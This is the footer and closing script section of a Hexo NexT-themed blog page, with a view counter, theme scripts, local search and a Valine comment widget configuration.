    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : true,
      notify     : false,
      appId      : 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
      appKey     : 'qdSjFo9LUO20Ba6XRPMQGX7v',
      placeholder: "Leave something interesting......",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
